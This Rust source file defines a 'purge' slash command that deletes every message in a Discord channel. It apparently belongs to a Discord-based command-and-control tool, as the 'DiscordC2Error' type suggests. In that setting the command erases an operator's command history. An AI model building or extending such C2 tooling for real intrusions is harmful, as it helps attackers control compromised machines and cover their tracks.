use crate::errors::DiscordC2Error;
use crate::event_handler::ephemeral_interaction_create;

use serenity::{
    builder::CreateApplicationCommand,
    model::{
        application::interaction::application_command::ApplicationCommandInteraction,
        id::{ChannelId, MessageId},
    },
    prelude::*,
};

/// Registers the purge command with the provided `CreateApplicationCommand`.
///
/// # Arguments
///
/// * `command` - A mutable reference to the `CreateApplicationCommand` object.
///
/// # Returns
///
/// A mutable reference to the `CreateApplicationCommand` object, for chaining.
pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    command
        .name("purge")
        .description("Delete all messages in the channel.")
}

/// Deletes all messages in the provided `ChannelId`.
///
/// # Arguments
///
/// * `ctx` - A reference to the `Context`.
/// * `channel_id` - A reference to the `ChannelId` of the channel to be purged.
///
/// # Returns
///
/// A `String` indicating whether the purge was successful or if there was an error.
///
/// # Errors
///
/// Returns an error if there was a problem fetching or deleting messages.
///
/// # Notes
///
/// This method may not work correctly in all circumstances and should be optimized in the future.
pub async fn run(ctx: &Context, channel_id: &ChannelId) -> String {
    loop {
        let messages = match channel_id
            .messages(&ctx.http, |retriever| retriever.limit(100))
            .await
        {
            Ok(messages) if messages.is_empty() => break,
            Ok(messages) => messages,
            Err(e) => return format!("Error fetching messages: {:?}", e),
        };

        let message_ids: Vec<MessageId> = messages.iter().map(|msg| msg.id).collect();
        if let Err(e) = channel_id.delete_messages(&ctx.http, &message_ids).await {
            return format!("Error deleting messages: {:?}", e);
        }
    }

    "Messages have successfully been purged".to_string()
}

/// Handles the purge command interaction by deleting all messages in the channel.
/// Sends an ephemeral message back to the user with the result of the command.
///
/// # Arguments
///
/// * `ctx` - A reference to the Serenity context.
/// * `command` - A reference to the purge command interaction.
///
/// # Returns
///
/// Returns a Result containing `()` on success, or a `DiscordC2Error` on failure.
pub async fn purge_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
    let message_content = run(ctx, &command.channel_id).await;
    ephemeral_interaction_create(ctx, command, &message_content).await?;
    Ok(())
}
